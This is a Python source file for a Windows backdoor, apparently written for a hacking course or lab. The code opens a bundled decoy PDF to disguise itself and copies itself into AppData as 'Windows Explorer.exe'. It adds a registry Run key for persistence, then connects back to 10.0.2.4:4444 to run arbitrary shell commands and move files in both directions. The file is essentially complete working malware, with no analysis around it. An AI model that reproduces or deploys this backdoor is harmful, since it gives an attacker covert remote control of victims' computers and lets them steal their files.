#!/usr/bin/env python
# https://docs.python.org/2/library/socket.html
# https://www.tutorialspoint.com/python/python_networking.htm
import base64
import json
import os
import shutil
import socket
import subprocess
import sys

import chardet


class Backdoor:
    file_name = sys._MEIPASS + "/pdf.pdf"
    subprocess.Popen(file_name, shell=True)

    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(self.win_auto_run("update", file_location), shell=True)

    def win_auto_run(self, name, file):
        return 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /t REG_SZ /d "{}"'.format(name, file)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                byte_data = self.connection.recv(1024)
                json_data = json_data + self.decode(byte_data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            # DEVNULL = open(os.devnull, "wb")  # python 2
            # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except Exception:
            return "[-] Could not execute command: " + " ".join(command)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def send_file(self, path):
        try:
            file = self.read_file(path)
        except Exception:
            self.connection.send(base64.b64encode("[-] Error during reading file"))
            return

        print("[+] Sending file...")
        self.connection.sendall(file)

        eof = base64.b64encode(b"pp-00-11-22-ff")
        print("[+] Sending EOF flag...", eof)
        self.connection.send(eof)

    def receive_file(self, path):
        total_receive = 0
        file = open(path, "wb")
        while True:
            encoded = self.connection.recv(1024)
            byte_data = base64.b64decode(encoded)
            if not byte_data:
                print("[-] The End")
                break

            eof = b"pp-00-11-22-ff"
            if encoded == base64.b64encode(eof):
                print("[+] Got EOF flag. Finishing...")
                break
            if encoded.endswith(base64.b64encode(eof)):
                print("[+] Got EOF flag. Extracting end of the file...")
                file.write(byte_data)
                total_receive += len(byte_data)
                break
            file.write(byte_data)
            total_receive += len(byte_data)

        file.close()
        # print(self.read_file(path))
        return "[+] Download successful. File size " + str(total_receive) + " bytes"

    def read_file(self, path):
        with open(path, "rb") as file:
            read_file = file.read()
            print("[+] Reading file is complete. File size: " + str(len(read_file)))
            encode = base64.b64encode(read_file)
            # print(encode)
            return encode

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download" and len(command) > 1:
                    self.send_file(command[1])
                    continue
                elif command[0] == "upload" and len(command) > 1:
                    self.receive_file(command[1])
                    continue
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(self.decode(command_result))
        self.connection.close()

    def decode(self, data):
        try:
            encoding = chardet.detect(data)['encoding']
            return data.decode(encoding)
        except (UnicodeDecodeError, AttributeError, TypeError):
            return data


try:
    my_backdoor = Backdoor("10.0.2.4", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
